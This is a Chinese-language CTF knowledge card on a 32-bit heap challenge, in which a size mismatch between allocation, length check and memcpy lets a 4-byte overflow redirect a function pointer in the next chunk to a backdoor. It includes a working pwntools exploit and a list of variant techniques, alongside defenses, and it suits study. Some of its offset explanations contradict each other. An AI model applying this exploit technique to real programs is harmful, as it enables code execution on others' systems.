---
id: binary-pwn-heap-alloc-0x1c-edit-limit-0x28-chunk-funcptr-backdoor
title: 笔记堆题：add 只申请 0x1c 却在 edit 里按 0x28 校验并 memcpy 0x20，溢出覆写下一块 chunk 的函数指针为 backdoor
type: scenario
domain: binary
path: binary/pwn/heap
technique: heap-chunk-size-mismatch-memcpy-funcptr-backdoor
aliases:
- anote
- 申请 0x1c 改 0x28
- memcpy 0x20 堆溢出
- 覆写下一块函数指针
- chunk 内函数指针劫持
- 无 free 堆题
tags:
- pwn
- heap
- heap-overflow
- function-pointer
- size-mismatch
- backdoor
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:41:51+08:00'
  notes: 已对照原文核对；本次核对未读取图片；add 申请 0x1c、edit 按 40 校验并 memcpy 0x20、backdoor=0x80489CE、create() 两次 + show(0) 取 gift 堆地址 + edit(0,payload) 后 edit(1,b'a') 触发的 exp 流程与正文一致；已修正两处措辞（原文只有一题 anote，卡片原写「两道题」；PoC 的 payload 构造已改为与正文 p32(backdoor)+ljust(0x14,'a')+p32(0x21)+p32(heap+8) 逐行对应），并把「0x20 字节『包含 8 字节 size 字段+0x18 可用』」这一错误描述改为 i386 0x20 chunk 可用 0x1c、溢出 4 字节落在下一块头部；原文未给组件版本区间，未设 affected_versions；
---

## 一句话结论

`add` 只按 0x1c 申请 chunk（可用 0x1c 字节），但 `edit` 用 `len <= 40` 做上限校验、随后 `memcpy(dst, src, 0x20)` 写入 0x20 字节，多出的 4 字节正好压在下一块 chunk 的 user data 起始处；题目自带 backdoor 且 `show` 会 printf 堆地址，于是「溢出 4 字节覆写下一块里保存的函数指针 → 触发调用」就直通命令执行，无需泄露 libc。

## 原理

- **长度校验与实际拷贝长度不一致**：申请大小 `0x1c`（28 字节），`edit` 的长度上限却写成 `40`（0x28），拷贝长度又硬编码 `0x20`。三个数字互不相等，导致**能写入的内容比 chunk 可用空间多**，向上溢出到相邻 chunk。
- **chunk 布局决定溢出落点**：i386 下 `malloc(0x1c)` 拿到的 0x20 chunk 可用 0x1c 字节（4 字节 size 字段，`prev_size` 被前一块复用），攻击者写 0x20 字节时正好越过本块可用区 4 字节，落到下一块 chunk 的**头部（`prev_size`/`size`）**，再往后才写进其 user data。i386 无 PIE、无 safe-linking，指针直接写绝对地址即可。
- **被覆写的是函数指针而非返回地址**：程序在 chunk 内保存一个函数指针（或结构体首字段），后续 `edit`/`show` 走 `((void(*)(int))ptr)(idx)` 形式的间接调用。把该指针改成题目自带的 backdoor 函数，等于用一次堆溢出换一次任意函数调用，绕开了「没有 free、没有 UAF」的限制。
- **gift 泄露堆地址**：`show` 顺手打印 chunk 地址，省掉堆地址爆破，使「下一块 chunk 地址」和「要改写的字段偏移」都可直接算出。
- **为什么不需要 libc**：目标是程序里现成的 backdoor（或 `system` 前的封装），不需要 libc base；这使整条链只需一次溢出、一次触发，稳定性高。

## 触发条件

- 存在 add/edit/show 类菜单，`edit` 的长度上限或拷贝长度大于申请大小（典型 0x1c vs 0x28 vs 0x20）。
- 相邻 chunk 内保存可被间接调用的函数指针，或存在可控的 `ops`/vtable 风格字段。
- 二进制无 PIE（或已泄露代码基址），且程序内含 backdoor/`system` 封装。
- 溢出长度受 `memcpy` 固定值限制（本例仅 4 字节有效），因此目标字段必须恰好落在下一个 8/4 字节边界上。

## 利用步骤

1. `add()` 两次，让 chunk0 与 chunk1 相邻（无 free，分配顺序即内存顺序）。
2. `show(0)` 读 gift，得到 chunk0 的 user data 地址；chunk1 的 user data 约为该地址 + 0x20（32 位下按 0x10/0x8 对齐实测修正）。
3. 构造 payload 覆盖 chunk0 的 0x1c 字节，使末尾 4 字节落在 chunk1 的函数指针字段上：`p32(backdoor)` 保持在 chunk0 起始的字段、中间用任意字节填充，最后 `p32(chunk1_user_data)` 之类的指针按题目的结构布局摆放。
4. `edit(0, payload)` 写入（长度报 40 以通过校验，实际只发 0x20 字节）。
5. `edit(1, b"a")` 触发 chunk1 的间接调用，跳到 backdoor 拿到命令执行。

## PoC

```python
from pwn import *
context(log_level='debug', arch='i386', os='linux')
io = remote(host, port)

def add():
    io.sendlineafter(b"Choice>>", b"1")
def show(idx):
    io.sendlineafter(b"Choice>>", b"2")
    io.sendlineafter(b"index: ", str(idx))
def edit(idx, data):
    io.sendlineafter(b"Choice>>", b"3")
    io.sendlineafter(b"index: ", str(idx))
    io.sendlineafter(b"len: ", b"40")       # 校验按 40 放行
    io.recvuntil(b"content: ")
    io.sendline(data)

backdoor = 0x080489CE
add(); add()
show(0)
io.recvuntil(b"gift: 0x")
heap = int(io.recv(7), 16)
payload  = p32(backdoor)                     # 写入 chunk0 起始处的函数指针字段
payload  = payload.ljust(0x10 + 0x4, b"a")   # 用 a 填充到下一块 chunk 头部
payload += p32(0x21) + p32(heap + 0x8)       # 伪 size 字段 + 指向下一块的指针
edit(0, payload)
edit(1, b"a")                                # 触发下一块里的函数指针
io.interactive()
```

上面的具体偏移/`0x21` size 字段按本题实测得到，换题时先用 `show` 的 gift 对齐真实相邻块，再按「本块可用字节数」推溢出点。

## 变体与关联

- 尺寸来源变体：`strcpy`/`strncpy` 固定长度、`read(fd, buf, 0x20)`、`memcpy(..., 0x20)`、`atoi` 后不校验上限，都会造成同类「申请小于写入」溢出。
- 目标字段变体：下一块的函数指针 → chunk 内 `ops`/vtable → `__free_hook`/`__malloc_hook`（有 free 时）→ tcache `next`（有 UAF 时）。
- 取址变体：无 gift 时靠无 PIE 的 BSS 固定地址、或先泄露 heap（`show` 输出已释放块的 fd 指针）再算。
- 关联：与「BSS 相邻数组越界覆写函数指针表」同属「改指针表拿控制流」，区别是本条走堆相邻块、溢出长度只有 4 字节；与 tcache/fastbin poisoning 的区别是这里不需要 free。

## 检测与防御

- 统一「申请大小 / 校验上限 / 拷贝长度」三个值，用同一常量或 `sizeof` 推导，拷贝前 `min(len, alloc_size)`。
- 开启 PIE、`FORTIFY_SOURCE`（`__memcpy_chk` 会在长度超限时 abort）、`-fsanitize=address` 回归测试。
- 不要把可间接调用的函数指针放进堆上可被溢出的结构体；改为在只读表（`.data.rel.ro`）里保存、或加指针校验（shadow/canary）。
- 检测：CTF 之外的真实程序中，出现 `edit` 后紧跟一次「无数据变更的调用」往往就是触发动作；可用 glibc 的 `MALLOC_CHECK_`/`chunk size` 校验发现越界写坏 size 字段。
